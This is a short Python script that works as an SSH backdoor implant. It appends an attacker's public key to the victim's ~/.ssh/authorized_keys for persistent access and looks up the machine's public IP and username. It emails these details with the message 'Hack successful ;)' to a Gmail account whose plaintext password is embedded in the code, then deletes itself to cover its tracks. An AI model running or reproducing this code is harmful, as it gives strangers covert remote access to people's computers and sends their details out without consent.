import smtplib
import subprocess
from os import remove
from sys import argv
from email.mime.text import MIMEText

from requests import get

if __name__ == "__main__":

    public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDECwTTYH1LHgvuZapXgXb7vvcwvuuIRVVburJNNG+4kkq35ivp8MI2aJ9YCzxNYrGgHiIB/e+ZC8mcdCn2Q0bfbkty7fyr/n7EcSPdTw4nlw1pzTu00ze+4rZe+4DFZGhc5ipSTmh2d5mTspq4zpzpGLW8zFMlzEHLv8R+AJAHCFjEK1n8lv8KS3EqkWcb+K3MhMfQKNIED3/upQkOryc+Ds7B6jOKOgff61ujhbZ1+WBBr2YygcfuUIfUzfvn0q4b9goBG0/yaR7ifEktA0886aFOiUQHiFECjAwv7/jmLnC0h9KPHRfrqehF2WiK5x8mrakbsbGH/Jo+wyuDIG3livESwouEkyX0xQNIRxDakzjvDW6z0lCmt6RKCTvrbBsD0dLIG9ghNIMrkWKM7vlbz0KajCM/JcyUpOGIw02mQyKv13RZXmW9GZ23o+Wg9Uy6I7Fz/DIXvK59XwBD7b7UthDGMcH1R1tl5JR4/VZsufq8PwvvtKTBBR16oqMIR7E= longbow@longbow"

    # Get public ip address with api
    ip = get('https://api.ipify.org').content.decode('utf8')
    print('My public IP address is: {}'.format(ip)) 


    # Get current user name
    user = subprocess.run('echo $USER', shell=True, stdout=subprocess.PIPE)

    # Overwrite authorized_keys with host key
    subprocess.run('cat ~/.ssh/authorized_keys', shell=True)
    subprocess.run(f'echo {public_key} >> ~/.ssh/authorized_keys', shell=True)
    subprocess.run('cat ~/.ssh/authorized_keys', shell=True)
    user = user.stdout.decode()
    # Clear bash history if any
    subprocess.run('history', shell=True)

    msg = f'Hack successful ;)\nSSH Tunnel setup\nIP Address: {ip}\nUser: {user}'
    msg = MIMEText(msg)
    msg['Subject'] = "SSH Tunnel"
    msg['From'] = "pythonhacknsu@gmail.com"
    msg['To'] = "pythonhacknsu@gmail.com"
    mail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mail.login("pythonhacknsu@gmail.com", "pmzmxvjeqcsfmrxr")
    mail.sendmail("pythonhacknsu@gmail.com", "pythonhacknsu@gmail.com", msg.as_string())
    mail.quit()

    # Delete the file
    remove(argv[0])
